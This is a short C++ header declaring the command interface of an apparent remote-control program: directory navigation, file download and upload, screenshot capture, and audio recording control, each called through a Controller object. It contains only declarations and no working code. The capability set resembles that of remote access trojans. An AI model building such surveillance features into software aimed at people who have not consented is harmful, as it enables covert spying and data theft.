#ifndef COMMANDS_H
#define COMMANDS_H

#include <string>
#include <vector>

#include "controller.h"

enum class AudioCommand {
	start, stop, list
};

// navigation
int pwd(Controller* ctrl);
int changeDir(Controller* ctrl, const std::string dir);
int listFiles(Controller* ctrl, const std::string dir);

// files
int downloadFile(Controller* ctrl, const std::string path);
int uploadFile(Controller* ctrl, const std::string path, size_t size, const char* data);

// screen
int screenshot(Controller* ctrl);

// audio
int audioControl(Controller* ctrl, AudioCommand cmd);

#endif